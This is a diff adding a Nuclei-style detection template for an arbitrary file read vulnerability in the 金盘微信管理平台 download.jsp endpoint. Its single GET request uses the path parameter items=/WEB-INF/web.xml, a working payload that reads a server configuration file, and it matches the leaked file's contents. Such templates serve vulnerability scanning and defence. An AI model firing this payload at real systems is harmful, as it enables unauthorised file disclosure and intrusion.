@@ -1,0 +1,28 @@
+id: poc-yaml-jinpan-wechat-download-jsp-anyfile-read
+
+info:
+  name: 金盘微信管理平台 download.jsp 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in the 金盘微信管理平台 by sending a request to the download.jsp endpoint and searching for specific patterns in the response indicating the presence of the targeted file.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobile/pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "<filter>"
+      - type: word
+        part: header
+        words:
+          - "filename=\"web.xml\""
